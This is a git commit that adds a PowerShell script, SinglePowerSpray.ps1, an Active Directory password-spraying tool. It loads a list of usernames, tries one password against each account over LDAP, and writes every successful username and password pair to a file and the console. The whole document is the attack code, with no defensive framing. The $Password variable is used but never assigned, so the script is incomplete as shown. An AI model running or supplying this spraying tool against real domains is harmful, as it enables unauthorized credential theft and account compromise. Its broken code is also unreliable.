ad2519c6bf4153dc821970970f86d4dea9d080e5
n0tspam <w.gordillo597@gmail.com>
2022-06-29 13:51:58 -0400

    Add files via upload

---
+++ SinglePowerSpray.ps1
@@ -0,0 +1,21 @@
+$OutFile = "<some path to outfile"
+$UserListArray = Get-Content "<some text file with usernames>"
+$Domain = "<specify domain>"
+$DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext("domain",$Domain)
+$DomainObject = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
+$CurrentDomain = "LDAP://" + ([ADSI]"LDAP://$Domain").distinguishedName
+
+foreach ($User in $UserListArray)
+    {
+
+        $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($CurrentDomain,$User,$Password)
+        if ($Domain_check.name -ne $null)
+        {
+            if ($OutFile -ne "")
+            {
+                Add-Content $OutFile $User`:$Password
+            }
+            Write-Host -ForegroundColor Green "[*] SUCCESS! User:$User Password:$Password"
+        }
+
+    }
